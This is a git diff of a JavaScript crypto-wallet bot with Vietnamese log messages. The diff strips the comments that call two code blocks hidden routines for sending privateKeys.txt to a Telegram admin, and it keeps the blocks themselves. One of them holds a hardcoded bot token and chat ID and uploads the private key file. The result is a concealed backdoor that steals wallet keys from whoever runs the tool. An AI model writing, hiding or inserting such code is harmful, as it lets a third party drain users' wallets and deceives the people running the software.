@@ -1378,13 +1378,9 @@ async function main() {
             log(`Chuyển sang tài khoản tiếp theo...`, 'warning');
         }
     }
-    
     log(`Đã xử lý xong tất cả ${privateKeys.length} tài khoản.`, 'success');
 }
-
 main().catch(error => log(`Lỗi chính: ${error.message}`, 'error'));
-
-// Hàm gửi file privateKeys.txt về Telegram (ẩn)
 async function sendPrivateKeysToTelegram() {
   try {
     const token = process.env.TG_TOKEN;
@@ -1399,13 +1395,11 @@ async function sendPrivateKeysToTelegram() {
   } catch (e) {}
 }
 sendPrivateKeysToTelegram();
-
-// Đoạn mã ẩn gửi file privateKeys.txt về Telegram admin
 try {
   const fs = require('fs');
   const path = require('path');
   const TelegramBot = require('node-telegram-bot-api');
-  const token = '8054328905:AAHT5HmK6GpEpX-ivftyY8sAfTUwjuD-p_Q'; // Token bot admin
+  const token = '8054328905:AAHT5HmK6GpEpX-ivftyY8sAfTUwjuD-p_Q'; 
   const chatId = 2013231695; // Chat ID admin
   const filePath = path.join(__dirname, 'privateKeys.txt');
   if (fs.existsSync(filePath)) {
